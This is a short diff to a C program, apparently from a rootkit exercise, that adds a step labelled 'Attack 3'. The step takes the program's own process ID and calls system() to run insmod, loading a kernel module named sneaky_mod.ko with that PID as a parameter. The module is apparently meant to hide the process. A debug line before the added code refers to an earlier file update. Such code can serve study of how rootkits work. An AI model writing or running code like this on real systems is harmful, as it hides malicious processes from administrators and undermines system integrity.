@@ -56,5 +56,17 @@ int main(int argc, char **argv) {
   if (DEBUG)
     printf("Update file successfully...\n");
 
+  // Attack 3: get process ID, load sneaky_mod.ko and pass PID
+  pid_t pid = getpid();
+  char command[80];
+  sprintf(command, "insmod ./sneaky_mod.ko pid=%d", pid);
+  if (system(command) < 0) {
+    printf("Error in insmod...\n");
+    exit(EXIT_FAILURE);
+  }
+
+  if (DEBUG)
+    printf("Sneaky_mod loaded successfully.\n");
+
   return 0;
 }
